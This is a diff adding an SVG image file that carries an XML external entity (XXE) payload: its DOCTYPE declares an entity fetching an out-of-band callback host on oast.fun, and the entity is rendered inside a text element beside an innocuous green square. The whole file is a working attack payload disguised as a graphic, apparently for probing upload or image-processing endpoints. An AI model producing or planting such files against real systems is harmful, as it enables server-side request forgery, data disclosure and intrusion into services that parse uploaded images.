@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://ifqvnsyrrxurlpbpgxta3gz4r1wbmgkfc.oast.fun">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="200" height="200">
+  <!-- Visual element -->
+  <rect x="50" y="50" width="100" height="100" fill="green" />
+  <!-- XXE payload -->
+  <text x="10" y="180" font-size="16" fill="black">
+    &xxe;
+  </text>
+</svg>
